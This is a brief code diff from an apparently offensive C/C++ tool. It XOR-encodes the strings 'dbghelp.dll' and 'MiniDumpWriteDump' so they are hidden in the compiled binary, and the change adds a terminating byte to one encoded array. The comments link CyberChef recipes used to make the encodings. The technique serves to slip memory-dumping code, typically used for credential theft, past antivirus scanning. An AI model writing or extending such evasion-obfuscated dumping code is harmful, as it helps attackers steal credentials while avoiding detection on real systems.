@@ -151,7 +151,7 @@ int main(int argc, char** argv) {
     for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
-    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f };
+    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f,0x44 };
     for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
